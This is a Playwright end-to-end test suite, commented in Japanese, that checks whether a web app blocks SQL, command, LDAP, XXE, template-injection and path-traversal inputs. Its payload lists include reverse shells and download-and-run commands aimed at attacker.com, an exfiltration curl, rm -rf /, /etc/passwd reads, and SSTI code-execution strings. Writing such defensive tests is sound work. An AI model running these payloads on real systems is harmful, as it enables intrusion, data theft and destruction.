// TEST-E2E-024: インジェクション攻撃防御テスト（5 SP）
// SQL injection, Command injection, LDAP injection, XML injection prevention
import { test, expect } from '@playwright/test';

test.describe('TEST-E2E-024: インジェクション攻撃防御テスト', () => {
  let page;

  test.beforeEach(async ({ browser }) => {
    page = await browser.newPage();
    await page.goto('/');
    await page.waitForLoadState('networkidle');
    
    // セキュリティ防御システムの初期化を待機
    await page.waitForFunction(() => {
      return window.SQLInjectionProtector && 
             window.CommandInjectionProtector && 
             window.InputValidator &&
             window.SecurityLogger;
    });
  });

  test.afterEach(async () => {
    await page.close();
  });

  test('SQLインジェクション防御テスト', async () => {
    test.setTimeout(90000);

    const sqlInjectionPayloads = [
      // 基本的なSQLインジェクション
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "admin'--",
      "' OR 1=1 --",
      
      // 高度なSQLインジェクション
      "1'; EXEC sp_configure 'show advanced options', 1; --",
      "'; SHUTDOWN; --",
      "' OR (SELECT COUNT(*) FROM sysobjects) > 0 --",
      "'; EXEC xp_cmdshell('dir'); --",
      
      // ブラインドSQLインジェクション
      "' AND (SELECT SUBSTRING(@@version,1,1)) = '5' --",
      "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 64 --",
      
      // 時間ベースブラインドSQLインジェクション
      "'; WAITFOR DELAY '00:00:05'; --",
      "' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a') = 1; WAITFOR DELAY '00:00:03'; --",
      
      // NoSQLインジェクション (MongoDB)
      "'; db.users.drop(); //",
      "{ $ne: null }",
      "{ $where: 'this.username == this.password' }",
      
      // 日本語を含むSQLインジェクション
      "'; INSERT INTO users (username, password) VALUES ('悪意のあるユーザー', 'password'); --",
      "' OR username LIKE '%管理者%' --"
    ];

    // 1. ActionEditorでのSQLインジェクションテスト
    for (const payload of sqlInjectionPayloads) {
      await page.click('[data-testid="action-editor-btn"]');
      await page.waitForSelector('[data-testid="action-editor-modal"]');
      
      // 各入力フィールドにペイロードを注入
      await page.fill('[data-testid="action-from-input"]', payload);
      await page.fill('[data-testid="action-to-input"]', 'Target');
      await page.fill('[data-testid="action-message-input"]', `Test message with payload: ${payload}`);
      
      await page.click('[data-testid="action-save-btn"]');
      
      // セキュリティ警告が表示されることを確認
      const securityWarning = await page.waitForSelector('[data-testid="security-warning"]', { 
        state: 'visible', 
        timeout: 2000 
      }).catch(() => null);
      
      if (securityWarning) {
        const warningText = await page.textContent('[data-testid="security-warning"]');
        expect(warningText).toContain('不正な入力');
      }
      
      // モーダルを閉じる
      const closeBtn = await page.locator('[data-testid="action-editor-close"]').first();
      if (await closeBtn.isVisible()) {
        await closeBtn.click();
      }
      
      await page.waitForTimeout(100);
    }

    // 2. SQLインジェクション検出ログの確認
    const sqlInjectionLogs = await page.evaluate(() => {
      return window.SecurityLogger.getLogs('sql_injection');
    });

    expect(sqlInjectionLogs.length).toBeGreaterThan(0);
    expect(sqlInjectionLogs).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'sql_injection_attempt',
          severity: 'high',
          payload: expect.any(String),
          blocked: true
        })
      ])
    );

    // 3. データベースの整合性確認
    const dbIntegrityCheck = await page.evaluate(() => {
      return window.SQLInjectionProtector.checkDatabaseIntegrity();
    });

    expect(dbIntegrityCheck.compromised).toBe(false);
    expect(dbIntegrityCheck.tablesCount).toBeGreaterThan(0);

    // 4. パラメータ化クエリの使用確認
    const queryAnalysis = await page.evaluate(() => {
      return window.SQLInjectionProtector.getQueryAnalysis();
    });

    expect(queryAnalysis.parameterizedQueries).toBeGreaterThan(0);
    expect(queryAnalysis.unsafeQueries).toBe(0);
  });

  test('コマンドインジェクション防御テスト', async () => {
    test.setTimeout(90000);

    const commandInjectionPayloads = [
      // 基本的なコマンドインジェクション
      "; ls -la",
      "&& cat /etc/passwd",
      "| nc -e /bin/sh attacker.com 4444",
      "; rm -rf /",
      "&& curl http://malicious.com/steal.sh | sh",
      
      // Windowsコマンドインジェクション
      "& dir",
      "&& type C:\\Windows\\System32\\drivers\\etc\\hosts",
      "| powershell.exe -Command \"Get-Process\"",
      "; net user hacker password /add",
      
      // 高度なコマンドインジェクション
      "; python -c \"import os; os.system('whoami')\"",
      "&& node -e \"require('child_process').exec('id')\"",
      "| bash -c 'exec bash -i &>/dev/tcp/attacker.com/8080 <&1'",
      
      // エンコードされたコマンドインジェクション
      "; echo $(echo bHMgLWxh | base64 -d)",
      "&& eval $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",
      
      // 日本語を含むコマンドインジェクション
      "; echo '悪意のあるコマンド実行'",
      "&& echo 'システムを破壊します' > /tmp/malicious.txt"
    ];

    // 1. PlantUML処理でのコマンドインジェクションテスト
    for (const payload of commandInjectionPayloads) {
      const result = await page.evaluate(async (cmd) => {
        try {
          // PlantUMLパーサーにコマンドインジェクションを試行
          return await window.PlantUMLParser.parse(`@startuml
          participant A
          participant B
          A -> B: ${cmd}
          @enduml`);
        } catch (error) {
          return { error: error.message, blocked: true };
        }
      }, payload);

      // コマンドインジェクションがブロックされることを確認
      expect(result.blocked || result.error).toBeTruthy();
    }

    // 2. ファイルアップロード経由のコマンドインジェクション防御
    const maliciousFileContent = `#!/bin/bash
    echo "Malicious script executed"
    curl http://attacker.com/exfiltrate?data=$(whoami)
    `;

    await page.setInputFiles('[data-testid="file-upload"]', {
      name: 'malicious.sh',
      mimeType: 'text/plain',
      buffer: Buffer.from(maliciousFileContent)
    });

    const uploadResult = await page.evaluate(() => {
      return window.FileUploadHandler.getLastUploadResult();
    });

    expect(uploadResult.blocked).toBe(true);
    expect(uploadResult.reason).toContain('suspicious_content');

    // 3. コマンドインジェクション検出ログの確認
    const commandInjectionLogs = await page.evaluate(() => {
      return window.SecurityLogger.getLogs('command_injection');
    });

    expect(commandInjectionLogs.length).toBeGreaterThan(0);
    expect(commandInjectionLogs).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'command_injection_attempt',
          severity: 'critical',
          payload: expect.any(String),
          blocked: true
        })
      ])
    );

    // 4. システムコマンド実行の監視
    const systemCommandMonitoring = await page.evaluate(() => {
      return window.CommandInjectionProtector.getSystemCommandLog();
    });

    // 許可されていないシステムコマンドが実行されていないことを確認
    const unauthorizedCommands = systemCommandMonitoring.filter(cmd => 
      !cmd.authorized && cmd.executed
    );
    expect(unauthorizedCommands.length).toBe(0);
  });

  test('LDAPインジェクション防御テスト', async () => {
    test.setTimeout(60000);

    const ldapInjectionPayloads = [
      // 基本的なLDAPインジェクション
      "*)(uid=*",
      "*)(cn=*",
      "admin)(&(password=*)",
      "*))%00",
      
      // フィルターバイパス
      "*)|(password=*",
      "admin)(|(cn=*",
      "*)(objectClass=*",
      
      // ブラインドLDAPインジェクション
      "admin)(|(userPassword=a*",
      "user*)(|(userPassword=*))(cn=*",
      
      // 日本語を含むLDAPインジェクション
      "管理者)(&(password=*",
      "*)|(displayName=*日本語*"
    ];

    // 1. ユーザー検索でのLDAPインジェクションテスト
    for (const payload of ldapInjectionPayloads) {
      const searchResult = await page.evaluate(async (query) => {
        try {
          return await window.UserSearchManager.searchUsers(query);
        } catch (error) {
          return { error: error.message, blocked: true };
        }
      }, payload);

      // LDAPインジェクションがブロックされることを確認
      expect(searchResult.blocked || searchResult.error).toBeTruthy();
    }

    // 2. 認証でのLDAPインジェクション防御
    const authInjectionResults = [];
    for (const payload of ldapInjectionPayloads.slice(0, 5)) { // 一部のペイロードでテスト
      const authResult = await page.evaluate(async (username) => {
        try {
          return await window.AuthenticationManager.authenticateUser(username, 'password');
        } catch (error) {
          return { error: error.message, blocked: true };
        }
      }, payload);

      authInjectionResults.push(authResult);
    }

    // すべての認証試行がブロックされることを確認
    authInjectionResults.forEach(result => {
      expect(result.blocked || result.error || result.success === false).toBeTruthy();
    });

    // 3. LDAPインジェクション検出ログの確認
    const ldapInjectionLogs = await page.evaluate(() => {
      return window.SecurityLogger.getLogs('ldap_injection');
    });

    expect(ldapInjectionLogs.length).toBeGreaterThan(0);
    expect(ldapInjectionLogs).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'ldap_injection_attempt',
          severity: 'high',
          blocked: true
        })
      ])
    );
  });

  test('XMLインジェクション防御テスト', async () => {
    test.setTimeout(60000);

    const xmlInjectionPayloads = [
      // XXE (XML External Entity) 攻撃
      `<?xml version="1.0"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <data>&xxe;</data>`,
      
      // XXE with Parameter Entity
      `<?xml version="1.0"?>
      <!DOCTYPE foo [<!ENTITY % pe SYSTEM "http://attacker.com/evil.dtd"> %pe;]>
      <data>&external;</data>`,
      
      // XML Bomb (Billion Laughs Attack)
      `<?xml version="1.0"?>
      <!DOCTYPE lolz [
      <!ENTITY lol "lol">
      <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
      <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
      <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
      ]>
      <data>&lol4;</data>`,
      
      // CDATA injection
      `<data><![CDATA[]]><script>alert('XSS')</script><![CDATA[]]></data>`,
      
      // 日本語を含むXMLインジェクション
      `<?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE 悪意 [<!ENTITY attack SYSTEM "file:///etc/passwd">]>
      <データ>&attack;</データ>`
    ];

    // 1. XML設定ファイルのインポート機能テスト
    for (const payload of xmlInjectionPayloads) {
      const xmlParseResult = await page.evaluate(async (xmlContent) => {
        try {
          return await window.XMLConfigManager.importConfig(xmlContent);
        } catch (error) {
          return { error: error.message, blocked: true };
        }
      }, payload);

      // XMLインジェクションがブロックされることを確認
      expect(xmlParseResult.blocked || xmlParseResult.error).toBeTruthy();
    }

    // 2. PlantUML XMLエクスポート機能のXXE防御
    const xmlExportTest = await page.evaluate(async () => {
      try {
        const maliciousXml = `<?xml version="1.0"?>
        <!DOCTYPE plantuml [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <plantuml>&xxe;</plantuml>`;
        
        return await window.PlantUMLExporter.importFromXML(maliciousXml);
      } catch (error) {
        return { error: error.message, blocked: true };
      }
    });

    expect(xmlExportTest.blocked || xmlExportTest.error).toBeTruthy();

    // 3. SOAP/XML APIエンドポイントの防御
    const soapInjectionTest = await page.evaluate(async () => {
      const maliciousSoap = `<?xml version="1.0"?>
      <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <!DOCTYPE soap [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <soap:Body>
          <request>&xxe;</request>
        </soap:Body>
      </soap:Envelope>`;
      
      try {
        return await window.APIManager.postXML('/api/soap', maliciousSoap);
      } catch (error) {
        return { error: error.message, blocked: true };
      }
    });

    expect(soapInjectionTest.blocked || soapInjectionTest.error).toBeTruthy();

    // 4. XMLインジェクション検出ログの確認
    const xmlInjectionLogs = await page.evaluate(() => {
      return window.SecurityLogger.getLogs('xml_injection');
    });

    expect(xmlInjectionLogs.length).toBeGreaterThan(0);
    expect(xmlInjectionLogs).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'xml_injection_attempt',
          severity: 'high',
          blocked: true
        })
      ])
    );

    // 5. XML処理の安全性確認
    const xmlSecuritySettings = await page.evaluate(() => {
      return window.XMLConfigManager.getSecuritySettings();
    });

    expect(xmlSecuritySettings).toEqual(
      expect.objectContaining({
        disableExternalEntities: true,
        disableDTDProcessing: true,
        maxEntityExpansions: expect.any(Number)
      })
    );
  });

  test('テンプレートインジェクション防御テスト', async () => {
    test.setTimeout(60000);

    const templateInjectionPayloads = [
      // Server-Side Template Injection (SSTI)
      "{{7*7}}",
      "${7*7}",
      "#{7*7}",
      "<%=7*7%>",
      
      // Jinja2 (Python)
      "{{config.items()}}",
      "{{''.__class__.__mro__[2].__subclasses__()}}",
      "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
      
      // Twig (PHP)
      "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
      
      // Freemarker (Java)
      "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }",
      
      // Handlebars (JavaScript)
      "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').exec('whoami');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
      
      // Expression Language (EL)
      "${pageContext.request.getParameter('cmd')}",
      "#{request.getParameter('cmd')}",
      
      // 日本語を含むテンプレートインジェクション
      "{{システム破壊コマンド}}",
      "${悪意のある処理}"
    ];

    // 1. PlantUMLテンプレート機能でのインジェクション防御
    for (const payload of templateInjectionPayloads) {
      const templateResult = await page.evaluate(async (template) => {
        try {
          return await window.PlantUMLTemplateEngine.render(template, { user: 'test' });
        } catch (error) {
          return { error: error.message, blocked: true };
        }
      }, payload);

      // テンプレートインジェクションがブロックされることを確認
      expect(templateResult.blocked || templateResult.error).toBeTruthy();
    }

    // 2. カスタムテンプレート作成機能の防御
    for (const payload of templateInjectionPayloads.slice(0, 5)) {
      await page.click('[data-testid="template-editor-btn"]');
      await page.waitForSelector('[data-testid="template-editor-modal"]');
      
      await page.fill('[data-testid="template-content-input"]', `
        @startuml
        participant A
        participant B
        A -> B: ${payload}
        @enduml
      `);
      
      await page.click('[data-testid="template-save-btn"]');
      
      // セキュリティ警告の確認
      const templateSecurityWarning = await page.waitForSelector('[data-testid="template-security-warning"]', { 
        state: 'visible', 
        timeout: 2000 
      }).catch(() => null);
      
      if (templateSecurityWarning) {
        const warningText = await page.textContent('[data-testid="template-security-warning"]');
        expect(warningText).toContain('不正なテンプレート');
      }
      
      // モーダルを閉じる
      await page.click('[data-testid="template-editor-close"]');
      await page.waitForTimeout(100);
    }

    // 3. テンプレートインジェクション検出ログの確認
    const templateInjectionLogs = await page.evaluate(() => {
      return window.SecurityLogger.getLogs('template_injection');
    });

    expect(templateInjectionLogs.length).toBeGreaterThan(0);
    expect(templateInjectionLogs).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'template_injection_attempt',
          severity: 'high',
          blocked: true
        })
      ])
    );
  });

  test('パストラバーサル防御テスト', async () => {
    test.setTimeout(60000);

    const pathTraversalPayloads = [
      // 基本的なパストラバーサル
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "....//....//....//etc/passwd",
      
      // エンコードされたパストラバーサル
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "..%252f..%252f..%252fetc%252fpasswd",
      "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
      
      // Unicode エンコード
      "..%u002f..%u002f..%u002fetc%u002fpasswd",
      "..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd",
      
      // 日本語パスを含むトラバーサル
      "../../../日本語フォルダ/機密ファイル.txt",
      "..\\..\\..\\ユーザー\\管理者\\デスクトップ\\秘密.txt"
    ];

    // 1. ファイル読み込み機能での防御テスト
    for (const payload of pathTraversalPayloads) {
      const fileReadResult = await page.evaluate(async (path) => {
        try {
          return await window.FileManager.readFile(path);
        } catch (error) {
          return { error: error.message, blocked: true };
        }
      }, payload);

      // パストラバーサルがブロックされることを確認
      expect(fileReadResult.blocked || fileReadResult.error).toBeTruthy();
    }

    // 2. ファイルアップロード先指定での防御
    for (const payload of pathTraversalPayloads.slice(0, 5)) {
      const uploadResult = await page.evaluate(async (path) => {
        try {
          return await window.FileManager.uploadFile('test.txt', 'content', path);
        } catch (error) {
          return { error: error.message, blocked: true };
        }
      }, payload);

      expect(uploadResult.blocked || uploadResult.error).toBeTruthy();
    }

    // 3. パストラバーサル検出ログの確認
    const pathTraversalLogs = await page.evaluate(() => {
      return window.SecurityLogger.getLogs('path_traversal');
    });

    expect(pathTraversalLogs.length).toBeGreaterThan(0);
    expect(pathTraversalLogs).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'path_traversal_attempt',
          severity: 'high',
          blocked: true
        })
      ])
    );
  });

  test('包括的セキュリティ監査テスト', async () => {
    test.setTimeout(60000);

    // 1. 全体的なセキュリティ状態の確認
    const securityAudit = await page.evaluate(() => {
      return window.SecurityAuditor.performFullAudit();
    });

    expect(securityAudit).toEqual(
      expect.objectContaining({
        overallScore: expect.any(Number),
        vulnerabilities: expect.any(Array),
        recommendedActions: expect.any(Array),
        complianceStatus: expect.any(Object)
      })
    );

    // セキュリティスコアが最低基準を満たすことを確認
    expect(securityAudit.overallScore).toBeGreaterThan(80);

    // 2. 重大な脆弱性がないことを確認
    const criticalVulnerabilities = securityAudit.vulnerabilities.filter(
      vuln => vuln.severity === 'critical'
    );
    expect(criticalVulnerabilities.length).toBe(0);

    // 3. セキュリティヘッダーの確認
    const securityHeaders = await page.evaluate(() => {
      return window.SecurityAuditor.checkSecurityHeaders();
    });

    expect(securityHeaders).toEqual(
      expect.objectContaining({
        'Content-Security-Policy': expect.any(String),
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': expect.any(String),
        'X-XSS-Protection': expect.any(String)
      })
    );

    // 4. 入力サニタイゼーションの包括的テスト
    const sanitizationTest = await page.evaluate(() => {
      const testInputs = [
        '<script>alert("test")</script>',
        'javascript:alert("test")',
        '${7*7}',
        '{{7*7}}',
        "'; DROP TABLE users; --"
      ];

      return testInputs.map(input => ({
        original: input,
        sanitized: window.InputValidator.sanitize(input),
        isSafe: window.InputValidator.isSafe(input)
      }));
    });

    sanitizationTest.forEach(test => {
      expect(test.isSafe).toBe(false);
      expect(test.sanitized).not.toBe(test.original);
    });

    // 5. セキュリティログの詳細分析
    const securityLogAnalysis = await page.evaluate(() => {
      return window.SecurityLogger.generateSecurityReport();
    });

    expect(securityLogAnalysis).toEqual(
      expect.objectContaining({
        totalIncidents: expect.any(Number),
        blockedAttacks: expect.any(Number),
        attackTypes: expect.any(Object),
        timeline: expect.any(Array)
      })
    );

    // ブロック率が90%以上であることを確認
    const blockRate = securityLogAnalysis.blockedAttacks / securityLogAnalysis.totalIncidents;
    expect(blockRate).toBeGreaterThan(0.9);
  });
});